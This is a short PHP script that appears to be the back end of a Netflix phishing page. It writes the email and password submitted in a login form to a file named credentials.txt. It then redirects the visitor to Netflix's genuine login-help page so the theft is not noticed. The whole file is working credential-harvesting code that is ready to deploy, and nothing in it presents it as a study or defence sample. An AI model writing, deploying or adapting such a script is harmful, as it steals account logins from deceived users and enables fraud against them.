<?php

file_put_contents("credentials.txt", "[+] Netflix -> Usuario: " . $_POST['email'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com/us/LoginHelp');
exit();
?>
